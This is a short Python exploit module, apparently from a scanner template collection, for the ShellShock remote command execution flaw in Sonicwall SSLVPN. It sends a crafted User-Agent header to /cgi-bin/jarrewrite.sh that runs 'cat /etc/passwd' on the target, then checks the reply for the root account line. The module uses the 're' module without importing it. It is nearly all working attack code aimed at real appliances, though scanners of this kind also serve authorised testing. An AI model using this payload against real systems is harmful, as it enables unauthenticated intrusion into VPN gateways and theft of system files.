import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Sonicwall SSLVPN ShellShock RCE''',
        "description": '''A vulnerability in Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execute arbitrary commands.''',
        "severity": "critical",
        "references": [
            "https://twitter.com/chybeta/status/1353974652540882944", 
            "https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["shellshock", "sonicwall", "rce", "vpn"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cgi-bin/jarrewrite.sh"""
        method = "GET"
        data = """"""
        headers = {'User-Agent': '"() { :; }; echo ; /bin/bash -c \'cat /etc/passwd\'"', 'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url